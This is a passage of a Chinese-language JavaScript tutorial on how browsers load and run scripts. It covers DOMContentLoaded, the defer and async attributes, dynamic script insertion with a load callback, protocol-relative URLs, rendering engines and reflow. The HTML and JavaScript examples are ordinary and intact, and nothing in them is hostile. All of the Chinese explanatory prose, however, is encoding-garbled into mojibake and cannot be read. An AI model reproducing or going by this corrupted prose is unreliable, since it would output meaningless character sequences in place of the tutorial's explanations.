</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼ŒæŒ‡å®š<code>DOMContentLoaded</code>äº‹ä»¶å‘ç”Ÿåï¼Œæ‰å¼€å§‹æ‰§è¡Œç›¸å…³ä»£ç ã€‚<code>DOMContentLoaded</code>äº‹ä»¶åªæœ‰åœ¨ DOM ç»“æ„ç”Ÿæˆä¹‹åæ‰ä¼šè§¦å‘ã€‚</p> <p>å¦ä¸€ç§è§£å†³æ–¹æ³•æ˜¯ï¼Œä½¿ç”¨<code>&lt;script&gt;</code>æ ‡ç­¾çš„<code>onload</code>å±æ€§ã€‚å½“<code>&lt;script&gt;</code>æ ‡ç­¾æŒ‡å®šçš„å¤–éƒ¨è„šæœ¬æ–‡ä»¶ä¸‹è½½å’Œè§£æå®Œæˆï¼Œä¼šè§¦å‘ä¸€ä¸ª<code>load</code>äº‹ä»¶ï¼Œå¯ä»¥æŠŠæ‰€éœ€æ‰§è¡Œçš„ä»£ç ï¼Œæ”¾åœ¨è¿™ä¸ªäº‹ä»¶çš„å›è°ƒå‡½æ•°é‡Œé¢ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>jquery.min.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>console.log(document.body.innerHTML)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä½†æ˜¯ï¼Œå¦‚æœå°†è„šæœ¬æ”¾åœ¨é¡µé¢åº•éƒ¨ï¼Œå°±å¯ä»¥å®Œå…¨æŒ‰ç…§æ­£å¸¸çš„æ–¹å¼å†™ï¼Œä¸Šé¢ä¸¤ç§æ–¹å¼éƒ½ä¸éœ€è¦ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
  <span class="token comment">&lt;!-- å…¶ä»–ä»£ç   --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token punctuation">;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>å¦‚æœæœ‰å¤šä¸ª<code>script</code>æ ‡ç­¾ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ ·ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>a.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>b.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>æµè§ˆå™¨ä¼šåŒæ—¶å¹¶è¡Œä¸‹è½½<code>a.js</code>å’Œ<code>b.js</code>ï¼Œä½†æ˜¯ï¼Œæ‰§è¡Œæ—¶ä¼šä¿è¯å…ˆæ‰§è¡Œ<code>a.js</code>ï¼Œç„¶åå†æ‰§è¡Œ<code>b.js</code>ï¼Œå³ä½¿åè€…å…ˆä¸‹è½½å®Œæˆï¼Œä¹Ÿæ˜¯å¦‚æ­¤ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè„šæœ¬çš„æ‰§è¡Œé¡ºåºç”±å®ƒä»¬åœ¨é¡µé¢ä¸­çš„å‡ºç°é¡ºåºå†³å®šï¼Œè¿™æ˜¯ä¸ºäº†ä¿è¯è„šæœ¬ä¹‹é—´çš„ä¾èµ–å…³ç³»ä¸å—åˆ°ç ´åã€‚å½“ç„¶ï¼ŒåŠ è½½è¿™ä¸¤ä¸ªè„šæœ¬éƒ½ä¼šäº§ç”Ÿâ€œé˜»å¡æ•ˆåº”â€ï¼Œå¿…é¡»ç­‰åˆ°å®ƒä»¬éƒ½åŠ è½½å®Œæˆï¼Œæµè§ˆå™¨æ‰ä¼šç»§ç»­é¡µé¢æ¸²æŸ“ã€‚</p> <p>è§£æå’Œæ‰§è¡Œ CSSï¼Œä¹Ÿä¼šäº§ç”Ÿé˜»å¡ã€‚Firefox æµè§ˆå™¨ä¼šç­‰åˆ°è„šæœ¬å‰é¢çš„æ‰€æœ‰æ ·å¼è¡¨ï¼Œéƒ½ä¸‹è½½å¹¶è§£æå®Œï¼Œå†æ‰§è¡Œè„šæœ¬ï¼›Webkitåˆ™æ˜¯ä¸€æ—¦å‘ç°è„šæœ¬å¼•ç”¨äº†æ ·å¼ï¼Œå°±ä¼šæš‚åœæ‰§è¡Œè„šæœ¬ï¼Œç­‰åˆ°æ ·å¼è¡¨ä¸‹è½½å¹¶è§£æå®Œï¼Œå†æ¢å¤æ‰§è¡Œã€‚</p> <p>æ­¤å¤–ï¼Œå¯¹äºæ¥è‡ªåŒä¸€ä¸ªåŸŸåçš„èµ„æºï¼Œæ¯”å¦‚è„šæœ¬æ–‡ä»¶ã€æ ·å¼è¡¨æ–‡ä»¶ã€å›¾ç‰‡æ–‡ä»¶ç­‰ï¼Œæµè§ˆå™¨ä¸€èˆ¬æœ‰é™åˆ¶ï¼ŒåŒæ—¶æœ€å¤šä¸‹è½½6ï½20ä¸ªèµ„æºï¼Œå³æœ€å¤šåŒæ—¶æ‰“å¼€çš„ TCP è¿æ¥æœ‰é™åˆ¶ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢å¯¹æœåŠ¡å™¨é€ æˆå¤ªå¤§å‹åŠ›ã€‚å¦‚æœæ˜¯æ¥è‡ªä¸åŒåŸŸåçš„èµ„æºï¼Œå°±æ²¡æœ‰è¿™ä¸ªé™åˆ¶ã€‚æ‰€ä»¥ï¼Œé€šå¸¸æŠŠé™æ€æ–‡ä»¶æ”¾åœ¨ä¸åŒçš„åŸŸåä¹‹ä¸‹ï¼Œä»¥åŠ å¿«ä¸‹è½½é€Ÿåº¦ã€‚</p> <h3 id="defer-å±æ€§"><a href="#defer-å±æ€§" class="header-anchor">#</a> defer å±æ€§</h3> <p>ä¸ºäº†è§£å†³è„šæœ¬æ–‡ä»¶ä¸‹è½½é˜»å¡ç½‘é¡µæ¸²æŸ“çš„é—®é¢˜ï¼Œä¸€ä¸ªæ–¹æ³•æ˜¯å¯¹<code>&lt;script&gt;</code>å…ƒç´ åŠ å…¥<code>defer</code>å±æ€§ã€‚å®ƒçš„ä½œç”¨æ˜¯å»¶è¿Ÿè„šæœ¬çš„æ‰§è¡Œï¼Œç­‰åˆ° DOM åŠ è½½ç”Ÿæˆåï¼Œå†æ‰§è¡Œè„šæœ¬ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>a.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">defer</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>b.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">defer</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œåªæœ‰ç­‰åˆ° DOM åŠ è½½å®Œæˆåï¼Œæ‰ä¼šæ‰§è¡Œ<code>a.js</code>å’Œ<code>b.js</code>ã€‚</p> <p><code>defer</code>å±æ€§çš„è¿è¡Œæµç¨‹å¦‚ä¸‹ã€‚</p> <ol><li>æµè§ˆå™¨å¼€å§‹è§£æ HTML ç½‘é¡µã€‚</li> <li>è§£æè¿‡ç¨‹ä¸­ï¼Œå‘ç°å¸¦æœ‰<code>defer</code>å±æ€§çš„<code>&lt;script&gt;</code>å…ƒç´ ã€‚</li> <li>æµè§ˆå™¨ç»§ç»­å¾€ä¸‹è§£æ HTML ç½‘é¡µï¼ŒåŒæ—¶å¹¶è¡Œä¸‹è½½<code>&lt;script&gt;</code>å…ƒç´ åŠ è½½çš„å¤–éƒ¨è„šæœ¬ã€‚</li> <li>æµè§ˆå™¨å®Œæˆè§£æ HTML ç½‘é¡µï¼Œæ­¤æ—¶å†å›è¿‡å¤´æ‰§è¡Œå·²ç»ä¸‹è½½å®Œæˆçš„è„šæœ¬ã€‚</li></ol> <p>æœ‰äº†<code>defer</code>å±æ€§ï¼Œæµè§ˆå™¨ä¸‹è½½è„šæœ¬æ–‡ä»¶çš„æ—¶å€™ï¼Œä¸ä¼šé˜»å¡é¡µé¢æ¸²æŸ“ã€‚ä¸‹è½½çš„è„šæœ¬æ–‡ä»¶åœ¨<code>DOMContentLoaded</code>äº‹ä»¶è§¦å‘å‰æ‰§è¡Œï¼ˆå³åˆšåˆšè¯»å–å®Œ<code>&lt;/html&gt;</code>æ ‡ç­¾ï¼‰ï¼Œè€Œä¸”å¯ä»¥ä¿è¯æ‰§è¡Œé¡ºåºå°±æ˜¯å®ƒä»¬åœ¨é¡µé¢ä¸Šå‡ºç°çš„é¡ºåºã€‚</p> <p>å¯¹äºå†…ç½®è€Œä¸æ˜¯åŠ è½½å¤–éƒ¨è„šæœ¬çš„<code>script</code>æ ‡ç­¾ï¼Œä»¥åŠåŠ¨æ€ç”Ÿæˆçš„<code>script</code>æ ‡ç­¾ï¼Œ<code>defer</code>å±æ€§ä¸èµ·ä½œç”¨ã€‚å¦å¤–ï¼Œä½¿ç”¨<code>defer</code>åŠ è½½çš„å¤–éƒ¨è„šæœ¬ä¸åº”è¯¥ä½¿ç”¨<code>document.write</code>æ–¹æ³•ã€‚</p> <h3 id="async-å±æ€§"><a href="#async-å±æ€§" class="header-anchor">#</a> async å±æ€§</h3> <p>è§£å†³â€œé˜»å¡æ•ˆåº”â€çš„å¦ä¸€ä¸ªæ–¹æ³•æ˜¯å¯¹<code>&lt;script&gt;</code>å…ƒç´ åŠ å…¥<code>async</code>å±æ€§ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>a.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">async</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>b.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">async</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><code>async</code>å±æ€§çš„ä½œç”¨æ˜¯ï¼Œä½¿ç”¨å¦ä¸€ä¸ªè¿›ç¨‹ä¸‹è½½è„šæœ¬ï¼Œä¸‹è½½æ—¶ä¸ä¼šé˜»å¡æ¸²æŸ“ã€‚</p> <ol><li>æµè§ˆå™¨å¼€å§‹è§£æ HTML ç½‘é¡µã€‚</li> <li>è§£æè¿‡ç¨‹ä¸­ï¼Œå‘ç°å¸¦æœ‰<code>async</code>å±æ€§çš„<code>script</code>æ ‡ç­¾ã€‚</li> <li>æµè§ˆå™¨ç»§ç»­å¾€ä¸‹è§£æ HTML ç½‘é¡µï¼ŒåŒæ—¶å¹¶è¡Œä¸‹è½½<code>&lt;script&gt;</code>æ ‡ç­¾ä¸­çš„å¤–éƒ¨è„šæœ¬ã€‚</li> <li>è„šæœ¬ä¸‹è½½å®Œæˆï¼Œæµè§ˆå™¨æš‚åœè§£æ HTML ç½‘é¡µï¼Œå¼€å§‹æ‰§è¡Œä¸‹è½½çš„è„šæœ¬ã€‚</li> <li>è„šæœ¬æ‰§è¡Œå®Œæ¯•ï¼Œæµè§ˆå™¨æ¢å¤è§£æ HTML ç½‘é¡µã€‚</li></ol> <p><code>async</code>å±æ€§å¯ä»¥ä¿è¯è„šæœ¬ä¸‹è½½çš„åŒæ—¶ï¼Œæµè§ˆå™¨ç»§ç»­æ¸²æŸ“ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€æ—¦é‡‡ç”¨è¿™ä¸ªå±æ€§ï¼Œå°±æ— æ³•ä¿è¯è„šæœ¬çš„æ‰§è¡Œé¡ºåºã€‚å“ªä¸ªè„šæœ¬å…ˆä¸‹è½½ç»“æŸï¼Œå°±å…ˆæ‰§è¡Œé‚£ä¸ªè„šæœ¬ã€‚å¦å¤–ï¼Œä½¿ç”¨<code>async</code>å±æ€§çš„è„šæœ¬æ–‡ä»¶é‡Œé¢çš„ä»£ç ï¼Œä¸åº”è¯¥ä½¿ç”¨<code>document.write</code>æ–¹æ³•ã€‚</p> <p><code>defer</code>å±æ€§å’Œ<code>async</code>å±æ€§åˆ°åº•åº”è¯¥ä½¿ç”¨å“ªä¸€ä¸ªï¼Ÿ</p> <p>ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœè„šæœ¬ä¹‹é—´æ²¡æœ‰ä¾èµ–å…³ç³»ï¼Œå°±ä½¿ç”¨<code>async</code>å±æ€§ï¼Œå¦‚æœè„šæœ¬ä¹‹é—´æœ‰ä¾èµ–å…³ç³»ï¼Œå°±ä½¿ç”¨<code>defer</code>å±æ€§ã€‚å¦‚æœåŒæ—¶ä½¿ç”¨<code>async</code>å’Œ<code>defer</code>å±æ€§ï¼Œåè€…ä¸èµ·ä½œç”¨ï¼Œæµè§ˆå™¨è¡Œä¸ºç”±<code>async</code>å±æ€§å†³å®šã€‚</p> <h3 id="è„šæœ¬çš„åŠ¨æ€åŠ è½½"><a href="#è„šæœ¬çš„åŠ¨æ€åŠ è½½" class="header-anchor">#</a> è„šæœ¬çš„åŠ¨æ€åŠ è½½</h3> <p><code>&lt;script&gt;</code>å…ƒç´ è¿˜å¯ä»¥åŠ¨æ€ç”Ÿæˆï¼Œç”Ÿæˆåå†æ’å…¥é¡µé¢ï¼Œä»è€Œå®ç°è„šæœ¬çš„åŠ¨æ€åŠ è½½ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token punctuation">[</span><span class="token string">'a.js'</span><span class="token punctuation">,</span> <span class="token string">'b.js'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">src</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  script<span class="token punctuation">.</span>src <span class="token operator">=</span> src<span class="token punctuation">;</span>
  document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>è¿™ç§æ–¹æ³•çš„å¥½å¤„æ˜¯ï¼ŒåŠ¨æ€ç”Ÿæˆçš„<code>script</code>æ ‡ç­¾ä¸ä¼šé˜»å¡é¡µé¢æ¸²æŸ“ï¼Œä¹Ÿå°±ä¸ä¼šé€ æˆæµè§ˆå™¨å‡æ­»ã€‚ä½†æ˜¯é—®é¢˜åœ¨äºï¼Œè¿™ç§æ–¹æ³•æ— æ³•ä¿è¯è„šæœ¬çš„æ‰§è¡Œé¡ºåºï¼Œå“ªä¸ªè„šæœ¬æ–‡ä»¶å…ˆä¸‹è½½å®Œæˆï¼Œå°±å…ˆæ‰§è¡Œå“ªä¸ªã€‚</p> <p>å¦‚æœæƒ³é¿å…è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥è®¾ç½®asyncå±æ€§ä¸º<code>false</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token punctuation">[</span><span class="token string">'a.js'</span><span class="token punctuation">,</span> <span class="token string">'b.js'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">src</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  script<span class="token punctuation">.</span>src <span class="token operator">=</span> src<span class="token punctuation">;</span>
  script<span class="token punctuation">.</span>async <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>ä¸Šé¢çš„ä»£ç ä¸ä¼šé˜»å¡é¡µé¢æ¸²æŸ“ï¼Œè€Œä¸”å¯ä»¥ä¿è¯<code>b.js</code>åœ¨<code>a.js</code>åé¢æ‰§è¡Œã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¿™æ®µä»£ç åé¢åŠ è½½çš„è„šæœ¬æ–‡ä»¶ï¼Œä¼šå› æ­¤éƒ½ç­‰å¾…<code>b.js</code>æ‰§è¡Œå®Œæˆåå†æ‰§è¡Œã€‚</p> <p>å¦‚æœæƒ³ä¸ºåŠ¨æ€åŠ è½½çš„è„šæœ¬æŒ‡å®šå›è°ƒå‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å†™æ³•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">loadScript</span><span class="token punctuation">(</span><span class="token parameter">src<span class="token punctuation">,</span> done</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> js <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  js<span class="token punctuation">.</span>src <span class="token operator">=</span> src<span class="token punctuation">;</span>
  js<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  js<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Failed to load script '</span> <span class="token operator">+</span> src<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>js<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h3 id="åŠ è½½ä½¿ç”¨çš„åè®®"><a href="#åŠ è½½ä½¿ç”¨çš„åè®®" class="header-anchor">#</a> åŠ è½½ä½¿ç”¨çš„åè®®</h3> <p>å¦‚æœä¸æŒ‡å®šåè®®ï¼Œæµè§ˆå™¨é»˜è®¤é‡‡ç”¨ HTTP åè®®ä¸‹è½½ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>example.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢çš„<code>example.js</code>é»˜è®¤å°±æ˜¯é‡‡ç”¨ HTTP åè®®ä¸‹è½½ï¼Œå¦‚æœè¦é‡‡ç”¨ HTTPS åè®®ä¸‹è½½ï¼Œå¿…éœ€å†™æ˜ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>https://example.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä½†æ˜¯æœ‰æ—¶æˆ‘ä»¬ä¼šå¸Œæœ›ï¼Œæ ¹æ®é¡µé¢æœ¬èº«çš„åè®®æ¥å†³å®šåŠ è½½åè®®ï¼Œè¿™æ—¶å¯ä»¥é‡‡ç”¨ä¸‹é¢çš„å†™æ³•ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>//example.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="_3-æµè§ˆå™¨çš„ç»„æˆ"><a href="#_3-æµè§ˆå™¨çš„ç»„æˆ" class="header-anchor">#</a> 3.æµè§ˆå™¨çš„ç»„æˆ</h2> <p>æµè§ˆå™¨çš„æ ¸å¿ƒæ˜¯ä¸¤éƒ¨åˆ†ï¼šæ¸²æŸ“å¼•æ“å’Œ JavaScript è§£é‡Šå™¨ï¼ˆåˆç§° JavaScript å¼•æ“ï¼‰ã€‚</p> <h3 id="æ¸²æŸ“å¼•æ“"><a href="#æ¸²æŸ“å¼•æ“" class="header-anchor">#</a> æ¸²æŸ“å¼•æ“</h3> <p>æ¸²æŸ“å¼•æ“çš„ä¸»è¦ä½œç”¨æ˜¯ï¼Œå°†ç½‘é¡µä»£ç æ¸²æŸ“ä¸ºç”¨æˆ·è§†è§‰å¯ä»¥æ„ŸçŸ¥çš„å¹³é¢æ–‡æ¡£ã€‚</p> <p>ä¸åŒçš„æµè§ˆå™¨æœ‰ä¸åŒçš„æ¸²æŸ“å¼•æ“ã€‚</p> <ul><li>Firefoxï¼šGecko å¼•æ“</li> <li>Safariï¼šWebKit å¼•æ“</li> <li>Chromeï¼šBlink å¼•æ“</li> <li>IE: Trident å¼•æ“</li> <li>Edge: EdgeHTML å¼•æ“</li></ul> <p>æ¸²æŸ“å¼•æ“å¤„ç†ç½‘é¡µï¼Œé€šå¸¸åˆ†æˆå››ä¸ªé˜¶æ®µã€‚</p> <ol><li>è§£æä»£ç ï¼šHTML ä»£ç è§£æä¸º DOMï¼ŒCSS ä»£ç è§£æä¸º CSSOMï¼ˆCSS Object Modelï¼‰ã€‚</li> <li>å¯¹è±¡åˆæˆï¼šå°† DOM å’Œ CSSOM åˆæˆä¸€æ£µæ¸²æŸ“æ ‘ï¼ˆrender treeï¼‰ã€‚</li> <li>å¸ƒå±€ï¼šè®¡ç®—å‡ºæ¸²æŸ“æ ‘çš„å¸ƒå±€ï¼ˆlayoutï¼‰ã€‚</li> <li>ç»˜åˆ¶ï¼šå°†æ¸²æŸ“æ ‘ç»˜åˆ¶åˆ°å±å¹•ã€‚</li></ol> <p>ä»¥ä¸Šå››æ­¥å¹¶éä¸¥æ ¼æŒ‰é¡ºåºæ‰§è¡Œï¼Œå¾€å¾€ç¬¬ä¸€æ­¥è¿˜æ²¡å®Œæˆï¼Œç¬¬äºŒæ­¥å’Œç¬¬ä¸‰æ­¥å°±å·²ç»å¼€å§‹äº†ã€‚æ‰€ä»¥ï¼Œä¼šçœ‹åˆ°è¿™ç§æƒ…å†µï¼šç½‘é¡µçš„ HTML ä»£ç è¿˜æ²¡ä¸‹è½½å®Œï¼Œä½†æµè§ˆå™¨å·²ç»æ˜¾ç¤ºå‡ºå†…å®¹äº†ã€‚</p> <h3 id="é‡æµå’Œé‡ç»˜"><a href="#é‡æµå’Œé‡ç»˜" class="header-anchor">#</a> é‡æµå’Œé‡ç»˜</h3> <p>æ¸²æŸ“æ ‘è½¬æ¢ä¸ºç½‘é¡µå¸ƒå±€ï¼Œç§°ä¸ºâ€œå¸ƒå±€æµâ€ï¼ˆflowï¼‰ï¼›å¸ƒå±€æ˜¾ç¤ºåˆ°é¡µé¢çš„è¿™ä¸ªè¿‡ç¨‹ï¼Œç§°ä¸ºâ€œç»˜åˆ¶â€ï¼ˆpaintï¼‰ã€‚å®ƒä»¬éƒ½å…·æœ‰é˜»å¡æ•ˆåº”ï¼Œå¹¶ä¸”ä¼šè€—è´¹å¾ˆå¤šæ—¶é—´å’Œè®¡ç®—èµ„æºã€‚</p> <p>é¡µé¢ç”Ÿæˆä»¥åï¼Œè„šæœ¬æ“ä½œå’Œæ ·å¼è¡¨æ“ä½œï¼Œéƒ½ä¼šè§¦å‘â€œé‡æµâ€ï¼ˆreflowï¼‰å’Œâ€œé‡ç»˜â€ï¼ˆrepaintï¼‰ã€‚ç”¨æˆ·çš„äº’åŠ¨ä¹Ÿä¼šè§¦å‘é‡æµå’Œé‡ç»˜ï¼Œæ¯”å¦‚è®¾ç½®äº†é¼ æ 